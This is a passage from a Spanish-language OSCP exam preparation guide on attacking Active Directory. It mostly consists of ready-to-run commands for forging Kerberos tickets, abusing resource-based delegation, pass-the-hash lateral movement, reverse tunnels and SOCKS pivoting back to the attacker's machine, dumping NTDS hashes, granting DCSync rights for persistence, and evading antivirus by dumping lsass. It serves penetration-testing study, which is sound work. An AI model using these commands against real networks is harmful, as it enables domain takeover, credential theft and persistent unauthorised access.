Con el hash de una cuenta de servicio (o de máquina) forjas un TGS para ese servicio concreto sin hablar con el DC. Más sigiloso que el Golden y útil cuando solo quieres un servicio (CIFS, MSSQL, HTTP).

impacket-ticketer -nthash SERVICE_NTHASH -domain-sid S-1-5-21-... -domain $DOMAIN \
  -spn cifs/$DCHOST administrator

Abuso de delegación (si llegaste aquí por ahí)

Tres sabores. Unconstrained: un host con esta flag guarda TGTs de quien se conecta — fuerza a un DC a conectarse (PrinterBug) y captura su TGT. Constrained: puedes pedir tickets a servicios concretos en nombre de cualquiera (S4U2Proxy). RBCD: si tienes GenericWrite sobre un equipo, configuras delegación hacia él y te haces admin de ese host.

# RBCD (el más común en OSCP): tienes GenericWrite sobre el equipo objetivo
# 1) crea una cuenta de máquina que controles (MachineAccountQuota suele ser 10)
impacket-addcomputer $DOMAIN/$USER:$PASS -computer-name 'EVIL$' -computer-pass 'Evil123!' -dc-ip $DC
# 2) configura la delegación del objetivo hacia tu cuenta
impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write $DOMAIN/$USER:$PASS
# 3) pide un ticket de servicio impersonando a un admin
impacket-getST -spn cifs/target.$DOMAIN -impersonate administrator -dc-ip $DC $DOMAIN/'EVIL$':'Evil123!'
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass administrator@target.$DOMAIN
No olvides documentar. En el instante en que tengas SYSTEM/DA en el DC: screenshot de whoami /all + ipconfig + la(s) flag(s), y la cadena completa de comandos en tus notas. La cadena de AD vale 40 puntos y es todo-o-nada.

LMovimiento lateral y acceso remoto

Transversal a casi todas las posiciones: una vez tienes credencial o hash válido en un host, ¿cómo entras? Cada protocolo tiene su herramienta. Prueba en orden de comodidad: WinRM → wmiexec → psexec.

Puerto / protocoloHerramientaNotas
5985 WinRMevil-winrmLa mejor shell. Necesita que el user esté en "Remote Management Users" o sea admin.
445 SMB (servicio)psexecShell SYSTEM, crea un servicio (ruidoso, deja logs).
445 SMB (WMI)wmiexecSemi-interactiva, sin crear servicio. Más sigiloso.
445 SMB (task)atexec / smbexecVía tareas programadas / servicio temporal.
135 DCOMdcomexecAlternativa cuando psexec/wmiexec fallan.
3389 RDPxfreerdpGUI. Admite PtH con restricciones.
# WinRM (con pass o con hash)
evil-winrm -i $IP -u $USER -p $PASS
evil-winrm -i $IP -u $USER -H NTHASH

# Impacket *exec (user:pass o -hashes)
impacket-wmiexec $DOMAIN/$USER:$PASS@$IP
impacket-psexec  $DOMAIN/$USER@$IP -hashes $HASH
impacket-atexec  $DOMAIN/$USER:$PASS@$IP "whoami"
impacket-smbexec $DOMAIN/$USER:$PASS@$IP
impacket-dcomexec $DOMAIN/$USER:$PASS@$IP

# winrs (desde un Windows ya comprometido, sin subir nada)
winrs -r:$DCHOST -u:$DOMAIN\$USER -p:$PASS "whoami"

# RDP (Pass-the-Hash necesita Restricted Admin habilitado)
xfreerdp /v:$IP /u:$USER /p:$PASS /cert:ignore +clipboard /dynamic-resolution
xfreerdp /v:$IP /u:$USER /pth:NTHASH /cert:ignore
Ejecutar comandos en masa: nxc smb 10.10.10.0/24 -u $USER -p $PASS -x "whoami" (o -X para PowerShell) te deja lanzar un comando en todos los hosts donde eres admin de una sola vez — muy útil para cazar en qué equipo hay una sesión de admin.

TPivoting y tunneling

La posición transversal. Si el DC o una segunda subred no se alcanzan desde Kali, no cambias de posición: montas un túnel a través del host que ya controlas y sigues atacando. ligolo-ng es el más cómodo; chisel el más socorrido cuando no hay SSH.

ligolo-ng (el más cómodo — interfaz tun)

Crea una interfaz de red (tun) en Kali por la que enrutas la subred interna. No necesitas proxychains: tus herramientas usan la IP interna directamente, como si estuvieras en esa red.

# en Kali (proxy / servidor):
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# en el host comprometido (agent):
./agent -connect 10.10.14.1:11601 -ignore-cert

# en la consola de ligolo (Kali): selecciona la sesión y añade la ruta
session        # elige la sesión del agent
# en otra terminal Kali: enruta la subred interna por la interfaz ligolo
sudo ip route add 172.16.1.0/24 dev ligolo
# en ligolo:
start          # ahora alcanzas 172.16.1.x directamente con cualquier herramienta

chisel (SOCKS sin SSH)

Cuando no hay SSH en el objetivo. Levantas un servidor en Kali y el cliente en el host comprometido crea un proxy SOCKS inverso. Luego diriges las herramientas por ese SOCKS con proxychains.

# Kali (servidor):
./chisel server -p 9001 --reverse
# objetivo (cliente) — crea un SOCKS inverso en el 1080 de Kali:
./chisel client 10.10.14.1:9001 R:socks

SSH port forwarding

Si tienes credenciales SSH, es el túnel más limpio y sin binarios. Dynamic (-D) crea un SOCKS; Local (-L) expone un puerto interno concreto en tu Kali.

ssh -D 1080 user@$IP                       # SOCKS en 127.0.0.1:1080
ssh -L 3389:172.16.1.5:3389 user@$IP       # RDP interno → tu puerto 3389
# dirección inversa (si el objetivo no puede recibir conexiones salientes libres):
ssh -R 1080 user@kali

proxychains

Enruta cualquier herramienta TCP por el SOCKS que montaste (chisel/ssh). Configura el puerto en /etc/proxychains4.conf y antepón proxychains.

# /etc/proxychains4.conf  →  socks5 127.0.0.1 1080
proxychains nxc smb 172.16.1.0/24 -u $USER -p $PASS
proxychains impacket-psexec $DOMAIN/$USER@172.16.1.5 -hashes $HASH
proxychains xfreerdp /v:172.16.1.5 /u:$USER /p:$PASS
Con ligolo no necesitas proxychains: por eso es el favorito en el examen. Reserva chisel+proxychains para cuando ligolo no conecte (firewall, binario bloqueado).

ZPost-explotación y persistencia en el DC

Una vez dueño del dominio, esto es lo que conviene recoger y (si el objetivo lo pide) cómo mantener acceso. En el OSCP la persistencia rara vez puntúa — prioriza las flags y la documentación — pero conoce las técnicas por si una máquina las requiere.

  • Recoge todas las flags: proof.txt/local.txt en los escritorios de cada usuario y Administrator de cada host de la cadena.
  • Vuelca todo el NTDS (ya lo tienes de DCSync) por si necesitas crackear más cuentas para pivotar a otra máquina de la red.
  • Golden Ticket (ver P9) como persistencia: con el krbtgt entras cuando quieras aunque cambien contraseñas.
  • DCSync "ligero": concede a un usuario normal derechos de replicación (bloodyAD add dcsync) para re-volcar sin ser DA.
# confirmar dominio dominado y recoger pruebas
nxc smb $DC -u Administrator -H $HASH --ntds        # todos los hashes
evil-winrm -i $DC -u Administrator -H NTHASH
  Get-ChildItem C:\Users\*\Desktop\*.txt            # recoge flags

SOSCuando algo no funciona (síntoma → causa)

Errores típicos de AD y qué significan de verdad. El 90% son reloj, nombres o el tipo de secreto equivocado — no una técnica que te falte.

SíntomaCausa probable → arreglo
KRB_AP_ERR_SKEW / "clock skew too great"Tu reloj difiere del DC. sudo ntpdate $DC (o rdate -n $DC). Vuelve a pedir el ticket.
Kerberos falla con la IP pero no entiendes por quéKerberos usa nombres, no IPs. Usa $DCHOST y mapea el DC en /etc/hosts.
KDC_ERR_PREAUTH_FAILEDContraseña/hash incorrectos para esa cuenta, o la cuenta no existe. Revalida la cred con nxc.
WinRMAuthorizationError / 401 en evil-winrmLa cred es válida pero el user no puede usar WinRM. Necesita estar en "Remote Management Users" o ser admin local. Prueba wmiexec/psexec.
PtH funciona con psexec pero no con evil-winrmNormal: WinRM con hash exige que el user tenga acceso WinRM. Usa el hash por SMB (wmiexec/psexec) o crackéalo.
GetNPUsers/GetUserSPNs no devuelve nadaNo hay cuentas sin preauth / sin SPN, o el reloj/nombre está mal. Confirma con una cred válida y -request.
El hash que saqué no crackea ni sirve por PtH¿Es un hash de Kerberos (AS-REP/TGS), no NTLM? Esos solo se crackean (modos 18200/13100), no se pasan. Un NTLM sí se pasa.
ldapsearch: "Operations error" / bind fallaEl DC exige LDAP autenticado o firmado. Usa -D "$USER@$DOMAIN" -w "$PASS", o LDAPS (636).
secretsdump dice "STATUS_LOGON_FAILURE"Para cuentas locales falta --local-auth / dominio = hostname. Para DCSync hace falta privilegio de replicación.

bloodhound-python falla por DNSAñade -ns $DC y -dc $DCHOST, y asegúrate del /etc/hosts. El recolector resuelve nombres contra el DC.
No alcanzo el DC / una segunda subred desde KaliNo es una posición nueva: es red. Monta un túnel (ligolo/chisel) por el host que ya controlas.
Spraying bloquea cuentasTe pasaste del umbral de lockout. Mira getdompwinfo, haz 1 intento por ventana y usa kerbrute (no deja logins de red).
El binario (mimikatz/winPEAS) lo come el AVVuelca lsass a archivo y parséalo en Kali (pypykatz), usa reg save+secretsdump, o versiones ofuscadas. Prioriza métodos "living off the land".

EXGestión del examen (parte de AD)

La parte de AD del OSCP son 40 de los 100 puntos y funciona como una cadena: típicamente un host de entrada, un host intermedio y el DC. Es todo-o-nada por la cadena completa en el esquema clásico — llegar a mitad de camino no suma como las máquinas standalone. Trátala con una disciplina distinta.

  • Lee el objetivo del set de AD primero. Te dicen cuál es el host de entrada y a veces una credencial inicial. No pierdas tiempo escaneando el DC directamente si tu entrada es otra máquina.
  • Pregúntate siempre "¿en qué posición estoy?" antes de buscar un exploit nuevo. Repasa la lista completa de tu posición: el atasco casi siempre es un paso omitido.
  • Documenta a medida que avanzas, no al final. Cada comando que funciona + su salida, con screenshot. Si llegas al DC sin notas del camino, pierdes puntos aunque hayas ganado.
  • Screenshots obligatorios: cada proof.txt/local.txt con whoami + ipconfig visibles en la misma captura, en cada host de la cadena.
  • Cuidado con el lockout. Bloquear una cuenta objetivo puede estancarte horas. Spraying prudente y kerbrute.
  • Si te atascas 30+ min en una posición, no busques técnicas exóticas: vuelve arriba y verifica que hiciste toda la lista (¿corriste BloodHound? ¿miraste descripciones? ¿GPP? ¿SeImpersonate? ¿el reloj está sincronizado?).
  • El DC casi siempre cae por: una cadena de creds reutilizadas, Kerberoasting de una cuenta de servicio débil, un edge de BloodHound, AD CS, o DCSync una vez tienes replicación. Rara vez por un 0-day.
Mentalidad: AD no se "hackea", se recorre. Cada botín te mueve de casilla. Mantén un documento vivo con "posición actual → qué tengo → qué me falta probar" y lo demás sale solo.
